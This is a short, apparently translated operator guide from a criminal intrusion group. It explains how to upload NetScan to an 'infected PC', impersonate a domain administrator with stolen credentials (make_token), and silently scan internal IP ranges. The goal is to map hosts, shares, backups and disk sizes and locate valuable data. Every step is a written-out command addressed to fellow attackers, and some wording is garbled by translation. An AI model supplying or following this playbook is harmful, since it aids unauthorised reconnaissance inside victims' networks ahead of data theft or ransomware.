A great tool is NetScan, which facilitates the exploration and search of NASBackup, etc.
Scans networks by ranges, using the credits of the user  admin, on whose behalf the software was launched.
Gives the following information:
Hostname, open ports, groupdomain membership, total disk space, available balls, device manufacturer, PCserver role

1) Upload the NetScan folder to any infected PC. Let's say C:Programdatanetscan

2) cd C:programdatanetscan

3) make_token DOMAINadmin password

4) shell netscan.exe /hide /auto:"result.xml" /config:netscan.xml /range:192.168.0.1-192.168.1.255
We change the ranges to our own, we do not touch the rest

5) We are waiting. After completion, we will have a result file in the folder.xml, we will download it to our computer

6) Open NetScan on your windows, upload the downloaded file there and watch the result in a convenient format.
Sort by disk size, so you will immediately understand where the juice is hidden

Special thanks to Perry for their help in finding the technical documentation on the basis of which this manual was written.
Sonic, you can add NetScan to the algorithm
